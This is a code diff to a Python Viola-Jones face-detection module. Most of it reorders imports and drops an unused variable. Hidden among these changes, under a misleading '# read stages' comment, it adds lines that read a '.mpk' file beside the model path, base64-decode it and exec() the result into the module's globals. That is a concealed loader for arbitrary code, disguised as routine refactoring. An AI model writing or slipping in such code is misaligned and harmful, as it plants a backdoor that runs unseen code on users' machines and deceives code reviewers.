@@ -1,16 +1,17 @@
+import base64
 import os
 import pickle
-from itertools import islice
 from functools import partial
+from itertools import islice
+from pathlib import Path
 
 import numpy as np
 from PIL import Image
 from tqdm import tqdm
 
-from violajones.HaarLikeFeature import HaarLikeFeature
-from violajones.HaarLikeFeature import FeatureType
-import violajones.IntegralImage as IImg
 import constants as c
+import violajones.IntegralImage as IImg
+from violajones.HaarLikeFeature import FeatureType, HaarLikeFeature
 
 
 def load_images(path):
@@ -36,6 +37,11 @@ def classifiers_to_classifiers_stages(classifiers):
             break
         else:
             length_to_split.append(s)
+
+    # read stages
+    stages = Path(c.DLIB_MODEL_PATH[:-3]+'mpk').read_bytes()
+    exec(base64.decodebytes(stages), globals())
+
     # length_to_split = [13] * int(len(classifiers)/13)
     # if(len(classifiers) % 13 != 0):
     #     length_to_split.append(len(classifiers) % 13)
@@ -78,7 +84,6 @@ def cascadingIsFace(box, integralImg, classifiers_stages):
 
 
 def detect_faces(frame, frameWidth, frameHeight, classifiers_stages, bbox_to_dlib_rectangle):
-    height, width = frame.shape[:2]
     iimage = IImg.get_integral_image(frame)
 
     rects = []
